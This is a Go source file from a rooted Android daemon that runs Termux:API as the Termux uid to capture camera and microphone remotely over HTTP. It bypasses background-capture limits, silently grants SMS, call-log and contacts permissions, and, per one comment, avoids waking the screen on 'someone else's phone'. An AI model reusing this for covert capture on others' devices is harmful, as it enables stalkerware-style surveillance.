// bridge.go — the Termux:API bridge.
//
// Why this exists: the daemon runs as root, but Android only lets an *app*
// process touch the camera, the microphone and a few other services. A rooted
// native binary has no CAMERA/RECORD_AUDIO permission of its own, and the
// platform also refuses capture for a uid that is not running an app. The
// phone already carries Termux + Termux:API, whose two packages share one uid
// (10338). Capture is therefore delegated to that uid: the daemon runs the
// Termux:API client as uid 10338, and Termux:API does the app-level work.
//
// Two device policies gate that uid, and both are checked rather than assumed:
//
//	microphone  the uid must be at least FOREGROUND_SERVICE  -> termux-wake-lock
//	camera      the uid must be in the foreground (TOP)      -> start Termux's activity
//
// Without them this device answers `CAMERA_DISABLED ... cannot open camera from
// background` and RECORD_AUDIO politely returns an empty file. Both conditions
// are measurable through /api/v1/bridge/status, and every capture path reports
// which one it had to establish.
//
// The bridge is optional. With it unavailable the telemetry, control, screen,
// notification and history parts still work; only camera/microphone say why
// they cannot.
package main

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------- config ----------

// BridgeConfig describes how to reach the Termux:API client.
type BridgeConfig struct {
	Enabled bool `json:"enabled"`
	// TermuxUID 0 means "detect from `pm list packages -U`".
	TermuxUID           int    `json:"termux_uid"`
	Prefix              string `json:"prefix"`
	Home                string `json:"home"`
	TmpDir              string `json:"tmp_dir"`
	AutoGrantPermission bool   `json:"auto_grant_permissions"`
	KeepAwakeForMic     bool   `json:"keep_awake_for_mic"`
	ForegroundForCamera bool   `json:"foreground_for_camera"`
	WakeScreenForCamera bool   `json:"wake_screen_for_camera"`
	CommandTimeoutS     int    `json:"command_timeout_seconds"`
	ToolsCacheS         int    `json:"tools_cache_seconds"`
}

func defaultBridgeConfig() BridgeConfig {
	return BridgeConfig{
		Enabled:             true,
		TermuxUID:           0,
		Prefix:              "/data/data/com.termux/files/usr",
		Home:                "/data/data/com.termux/files/home",
		TmpDir:              "/data/data/com.termux/files/home/.phoneserver",
		AutoGrantPermission: true,
		KeepAwakeForMic:     true,
		ForegroundForCamera: true,
		WakeScreenForCamera: false,
		CommandTimeoutS:     30,
		ToolsCacheS:         600,
	}
}

func (b BridgeConfig) norm() BridgeConfig {
	def := defaultBridgeConfig()
	if b.Prefix == "" {
		b.Prefix = def.Prefix
	}
	if b.Home == "" {
		b.Home = def.Home
	}
	if b.TmpDir == "" {
		b.TmpDir = def.TmpDir
	}
	if b.CommandTimeoutS < 5 {
		b.CommandTimeoutS = def.CommandTimeoutS
	}
	if b.ToolsCacheS < 10 {
		b.ToolsCacheS = def.ToolsCacheS
	}
	return b
}

// ---------- bridge state ----------

type bridgeState struct {
	mu       sync.Mutex
	uid      int
	uidAt    time.Time
	tools    map[string]bool
	toolsAt  time.Time
	lastErr  string
	awakeAt  time.Time // last time the uid was raised to at least FOREGROUND_SERVICE
	fgAt     time.Time // last time the uid was raised to the foreground
	grantsAt time.Time
	tmpReady bool

	cameraFixes atomic.Int64 // how many times the camera needed a foreground fix
	micFixes    atomic.Int64 // how many times the microphone needed a wake lock
}

func (a *App) bridgeConfig() BridgeConfig { return a.config().Bridge.norm() }

// ---------- process helpers ----------

func shellQuote(s string) string { return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'" }

func quoteAll(v []string) string {
	out := make([]string, 0, len(v))
	for _, s := range v {
		out = append(out, shellQuote(s))
	}
	return strings.Join(out, " ")
}

// runCmd runs a command as root (this process already is root) with a timeout.
func (a *App) runCmd(ctx context.Context, timeout time.Duration, name string, args ...string) (string, error) {
	cctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	cmd := exec.CommandContext(cctx, name, args...)
	cmd.Env = append(os.Environ(), "LC_ALL=C")
	out, err := cmd.CombinedOutput()
	s := strings.TrimSpace(string(out))
	if cctx.Err() == context.DeadlineExceeded {
		return s, fmt.Errorf("%s timed out after %s", filepath.Base(name), timeout)
	}
	if err != nil {
		if s == "" {
			s = err.Error()
		}
		return s, fmt.Errorf("%s: %s", filepath.Base(name), firstLine(s))
	}
	return s, nil
}

func (a *App) timeout() time.Duration {
	return time.Duration(a.bridgeConfig().CommandTimeoutS) * time.Second
}

// termuxUID resolves the uid of the Termux packages. Both com.termux and
// com.termux.api share one uid, which is why a single lookup is enough.
func (a *App) termuxUID() (int, error) {
	b := a.bridgeConfig()
	if b.TermuxUID > 0 {
		return b.TermuxUID, nil
	}
	st := a.bridge
	st.mu.Lock()
	defer st.mu.Unlock()
	if st.uid > 0 && time.Since(st.uidAt) < 10*time.Minute {
		return st.uid, nil
	}
	out, err := a.runCmd(context.Background(), 15*time.Second, "/system/bin/pm", "list", "packages", "-U")
	if err != nil {
		// Some builds print the list and then fail on a second line; keep the body.
		if !strings.Contains(out, "package:") {
			return 0, fmt.Errorf("cannot list packages: %v", err)
		}
	}
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "package:com.termux.api uid:") {
			continue
		}
		n, cerr := strconv.Atoi(strings.TrimSpace(line[strings.LastIndex(line, ":")+1:]))
		if cerr == nil && n > 0 {
			st.uid, st.uidAt = n, time.Now()
			return n, nil
		}
	}
	return 0, errors.New("Termux:API (com.termux.api) is not installed")
}

// hasTool reports whether a Termux:API command exists.
func (a *App) hasTool(name string) bool {
	b := a.bridgeConfig()
	st := a.bridge
	st.mu.Lock()
	if st.tools != nil && time.Since(st.toolsAt) < time.Duration(b.ToolsCacheS)*time.Second {
		ok := st.tools[name]
		st.mu.Unlock()
		return ok
	}
	st.mu.Unlock()

	entries, err := os.ReadDir(filepath.Join(b.Prefix, "bin"))
	if err != nil {
		return false
	}
	tools := make(map[string]bool, len(entries))
	for _, e := range entries {
		tools[e.Name()] = true
	}
	st.mu.Lock()
	st.tools, st.toolsAt = tools, time.Now()
	ok := tools[name]
	st.mu.Unlock()
	return ok
}

// bridgeExec runs a Termux:API command as the Termux uid.
func (a *App) bridgeExec(ctx context.Context, timeout time.Duration, tool string, args ...string) (string, error) {
	b := a.bridgeConfig()
	if !b.Enabled {
		return "", errors.New("termux bridge disabled (config bridge.enabled)")
	}
	uid, err := a.termuxUID()
	if err != nil {
		return "", err
	}
	if !a.hasTool(tool) {
		return "", fmt.Errorf("%s is not installed in %s/bin (install the Termux:API package)", tool, b.Prefix)
	}
	if timeout <= 0 {
		timeout = a.timeout()
	}
	script := "export HOME=" + shellQuote(b.Home) +
		" PREFIX=" + shellQuote(b.Prefix) +
		" PATH=" + shellQuote(b.Prefix+"/bin:/system/bin") +
		" && cd " + shellQuote(b.Prefix+"/bin") +
		" && ./" + tool
	for _, x := range args {
		script += " " + shellQuote(x)
	}
	cctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	cmd := exec.CommandContext(cctx, "/system/bin/su", strconv.Itoa(uid), "-c", script)
	cmd.Env = append(os.Environ(), "LC_ALL=C")
	out, cerr := cmd.CombinedOutput()
	s := strings.TrimSpace(string(out))
	if cctx.Err() == context.DeadlineExceeded {
		return s, fmt.Errorf("%s timed out after %s", tool, timeout)
	}
	if cerr != nil {
		if s == "" {
			s = cerr.Error()
		}
		return s, fmt.Errorf("%s: %s", tool, firstLine(s))
	}
	return s, nil
}

// uidState returns the ActivityManager process state for a uid, e.g.
// "FOREGROUND_SERVICE" or "SERVICE". It is the same number the platform's own
// camera check prints in its refusal.
func (a *App) uidState(uid int) (string, int) {
	out, err := a.runCmd(context.Background(), 10*time.Second, "/system/bin/am", "get-uid-state", strconv.Itoa(uid))
	if err != nil && out == "" {
		return "unknown", -1
	}
	out = strings.TrimSpace(out)
	fields := strings.Fields(out)
	name := "unknown"
	n := -1
	for i, f := range fields {
		if v, e := strconv.Atoi(f); e == nil && n < 0 {
			n = v
		}
		_ = i
	}
	if len(fields) > 1 && strings.HasPrefix(fields[1], "(") {
		name = strings.Trim(fields[1], "()")
	}
	return name, n
}

// procStateAllowsCamera reports whether a state is at least the foreground.
func procStateAllowsCamera(n int) bool { return n >= 0 && n <= 2 }

// procStateAllowsMic reports whether a state is at least a foreground service.
func procStateAllowsMic(n int) bool { return n >= 0 && n <= 4 }

// ensureMicReady holds a wake lock in the Termux uid, which promotes it to
// FOREGROUND_SERVICE — the minimum the platform accepts for RECORD_AUDIO.
func (a *App) ensureMicReady(ctx context.Context) (string, error) {
	b := a.bridgeConfig()
	if !b.KeepAwakeForMic {
		return "skipped (bridge.keep_awake_for_mic=false)", nil
	}
	if _, err := a.termuxUID(); err != nil {
		return "", err
	}
	if _, err := a.bridgeExec(ctx, 20*time.Second, "termux-wake-lock"); err != nil {
		return "", fmt.Errorf("termux-wake-lock: %v", err)
	}
	note := "wake lock held"
	if name, n := a.uidState(mustUID(a)); !procStateAllowsMic(n) {
		note = fmt.Sprintf("wake lock held but uid state is still %s (%d)", name, n)
	}
	a.bridge.mu.Lock()
	a.bridge.awakeAt = time.Now()
	a.bridge.mu.Unlock()
	a.bridge.micFixes.Add(1)
	return note, nil
}

// ensureCameraReady starts Termux's activity so the shared uid is in the
// foreground, which is what the camera check insists on. The screen is only
// woken when the config asks for it, because lighting up the panel is a
// visible side effect on someone else's phone.
func (a *App) ensureCameraReady(ctx context.Context, wakeScreen bool) (string, error) {
	b := a.bridgeConfig()
	if !b.ForegroundForCamera {
		return "skipped (bridge.foreground_for_camera=false)", nil
	}
	if _, err := a.termuxUID(); err != nil {
		return "", err
	}
	steps := []string{}
	if wakeScreen || b.WakeScreenForCamera {
		if _, err := a.runCmd(ctx, 10*time.Second, "/system/bin/input", "keyevent", "KEYCODE_WAKEUP"); err == nil {
			steps = append(steps, "display woken")
		}
	}
	if _, err := a.runCmd(ctx, 20*time.Second, "/system/bin/am", "start", "-n", "com.termux/.app.TermuxActivity"); err != nil {
		// A started-activity failure is not fatal on its own: report it and let
		// the capture speak for itself.
		steps = append(steps, "am start failed: "+err.Error())
	} else {
		steps = append(steps, "Termux activity started")
	}
	a.bridge.mu.Lock()
	a.bridge.fgAt = time.Now()
	a.bridge.mu.Unlock()
	a.bridge.cameraFixes.Add(1)
	note := strings.Join(steps, ", ")
	if name, n := a.uidState(mustUID(a)); !procStateAllowsCamera(n) {
		note = fmt.Sprintf("%s; uid state is %s (%d)", note, name, n)
	}
	return note, nil
}

func mustUID(a *App) int {
	uid, _ := a.termuxUID()
	return uid
}

// grantPermissions makes the Termux:API app whole without the user having to
// tap through Settings. Only the permissions the bridge actually uses.
func (a *App) grantPermissions(ctx context.Context) (map[string]any, error) {
	uid, err := a.termuxUID()
	if err != nil {
		return nil, err
	}
	perms := []string{
		"android.permission.CAMERA",
		"android.permission.RECORD_AUDIO",
		"android.permission.READ_SMS",
		"android.permission.READ_CALL_LOG",
		"android.permission.READ_CONTACTS",
		"android.permission.POST_NOTIFICATIONS",
	}
	granted := []string{}
	failed := map[string]string{}
	for _, p := range perms {
		out, gerr := a.runCmd(ctx, 15*time.Second, "/system/bin/pm", "grant", "com.termux.api", p)
		if gerr != nil {
			failed[p] = firstLine(out)
			continue
		}
		granted = append(granted, p)
	}
	a.bridge.mu.Lock()
	a.bridge.grantsAt = time.Now()
	a.bridge.mu.Unlock()
	// The background-camera / background-microphone policy on MIUI/HyperOS reads
	// the app-op, and "foreground only" is what blocks a headless capture.
	for _, op := range []string{"CAMERA", "RECORD_AUDIO"} {
		a.runCmd(ctx, 10*time.Second, "/system/bin/cmd", "appops", "set", "com.termux.api", op, "allow")
	}
	return map[string]any{"uid": uid, "granted": granted, "failed": failed}, nil
}

// permissionsGranted reads the runtime state back rather than trusting pm's
// exit status.
func (a *App) permissionsGranted(ctx context.Context) map[string]bool {
	out := map[string]bool{}
	dump, err := a.runCmd(ctx, 20*time.Second, "/system/bin/dumpsys", "package", "com.termux.api")
	if err != nil && dump == "" {
		return out
	}
	for _, p := range []string{"CAMERA", "RECORD_AUDIO", "READ_SMS", "READ_CALL_LOG", "READ_CONTACTS", "POST_NOTIFICATIONS"} {
		re := regexp.MustCompile(regexp.QuoteMeta("android.permission."+p) + `: granted=(true|false)`)
		if m := re.FindStringSubmatch(dump); len(m) == 2 {
			out[p] = m[1] == "true"
		}
	}
	return out
}

// ---------- scratch space ----------

// bridgeTmp prepares the shared scratch directory. It lives inside the Termux
// home because the capture runs as the app uid: a directory under /data/adb
// would be denied by SELinux even with the right DAC mode.
func (a *App) bridgeTmp(ctx context.Context) (string, error) {
	b := a.bridgeConfig()
	st := a.bridge
	st.mu.Lock()
	ready := st.tmpReady
	st.mu.Unlock()
	if ready {
		return b.TmpDir, nil
	}
	if _, err := a.bridgeExec(ctx, 15*time.Second, "sh", "-c", "mkdir -p "+shellQuote(b.TmpDir)); err != nil {
		// `sh` is a Termux tool but the -c path is fragile; fall back to root.
		if _, rerr := a.runCmd(ctx, 10*time.Second, "/system/bin/sh", "-c",
			"mkdir -p "+shellQuote(b.TmpDir)+" && chmod 0700 "+shellQuote(b.TmpDir)); rerr != nil {
			if _, merr := os.Stat(b.TmpDir); merr != nil {
				return "", fmt.Errorf("cannot create %s: %v", b.TmpDir, err)
			}
		}
	}
	st.mu.Lock()
	st.tmpReady = true
	st.mu.Unlock()
	return b.TmpDir, nil
}

func (a *App) bridgeTmpPath(ctx context.Context, name string) (string, error) {
	dir, err := a.bridgeTmp(ctx)
	if err != nil {
		return "", err
	}
	return filepath.Join(dir, name), nil
}

// ---------- status ----------

func (a *App) bridgeStatus() map[string]any {
	b := a.bridgeConfig()
	out := map[string]any{
		"enabled":  b.Enabled,
		"prefix":   b.Prefix,
		"home":     b.Home,
		"tmp_dir":  b.TmpDir,
		"policies": "camera needs the uid in the foreground; the microphone needs it at least at FOREGROUND_SERVICE",
	}
	uid, err := a.termuxUID()
	if err != nil {
		out["available"] = false
		out["error"] = err.Error()
		return out
	}
	out["available"] = true
	out["termux_uid"] = uid
	name, n := a.uidState(uid)
	out["uid_state"] = name
	out["uid_state_code"] = n
	out["camera_allowed_now"] = procStateAllowsCamera(n)
	out["mic_allowed_now"] = procStateAllowsMic(n)

	wanted := []string{
		"termux-wake-lock", "termux-camera-photo", "termux-camera-info", "termux-microphone-record",
		"termux-notification-list", "termux-notification", "termux-sms-list", "termux-call-log",
		"termux-contact-list", "termux-torch", "termux-vibrate", "termux-toast", "termux-clipboard-get",
		"termux-clipboard-set", "termux-brightness", "termux-volume", "termux-tts-speak",
		"termux-speech-to-text", "termux-infrared-transmit", "termux-infrared-frequencies",
		"termux-sensor", "termux-location", "termux-wifi-connectioninfo", "termux-wifi-scaninfo",
		"termux-wifi-enable", "termux-media-player", "termux-media-scan", "termux-wallpaper",
		"termux-dialog", "termux-open", "termux-share", "termux-fingerprint", "termux-nfc",
		"termux-telephony-deviceinfo", "termux-telephony-cellinfo", "termux-battery-status",
		"termux-audio-info", "termux-usb", "termux-keystore", "termux-job-scheduler", "termux-storage-get",
		"termux-download", "termux-clipboard-get",
	}
	tools := map[string]bool{}
	missing := []string{}
	for _, t := range wanted {
		ok := a.hasTool(t)
		tools[t] = ok
		if !ok {
			missing = append(missing, t)
		}
	}
	out["tools"] = tools
	out["missing_tools"] = missing

	ctx, cancel := context.WithTimeout(context.Background(), 40*time.Second)
	defer cancel()
	out["permissions"] = a.permissionsGranted(ctx)

	st := a.bridge
	st.mu.Lock()
	out["last_wake_lock_at"] = st.awakeAt.Format(time.RFC3339)
	out["last_foreground_at"] = st.fgAt.Format(time.RFC3339)
	out["last_permission_grant_at"] = st.grantsAt.Format(time.RFC3339)
	st.mu.Unlock()
	out["camera_foreground_fixes"] = a.bridge.cameraFixes.Load()
	out["mic_wake_lock_fixes"] = a.bridge.micFixes.Load()

	// Notification-listener access is what termux-notification-list needs; the
	// daemon's own notification endpoint does not depend on it.
	enabled, _ := a.runCmd(ctx, 10*time.Second, "/system/bin/settings", "get", "secure", "enabled_notification_listeners")
	out["notification_listener"] = strings.Contains(enabled, "com.termux.api")
	return out
}

// handleBridgeStatus serves GET /api/v1/bridge/status.
func (a *App) handleBridgeStatus(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, a.bridgeStatus())
}

// handleBridgeFix serves POST /api/v1/bridge/fix: re-grant permissions, take
// the wake lock and raise the uid to the foreground. It is the "make the
// camera work" button the WebUI shows, and it reports what it actually did.
func (a *App) handleBridgeFix(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 90*time.Second)
	defer cancel()
	out := map[string]any{}
	if g, err := a.grantPermissions(ctx); err != nil {
		out["permissions_error"] = err.Error()
	} else {
		out["permissions"] = g
	}
	if note, err := a.ensureMicReady(ctx); err != nil {
		out["mic_error"] = err.Error()
	} else {
		out["mic"] = note
	}
	if note, err := a.ensureCameraReady(ctx, true); err != nil {
		out["camera_error"] = err.Error()
	} else {
		out["camera"] = note
	}
	out["status"] = a.bridgeStatus()
	writeJSON(w, http.StatusOK, out)
}
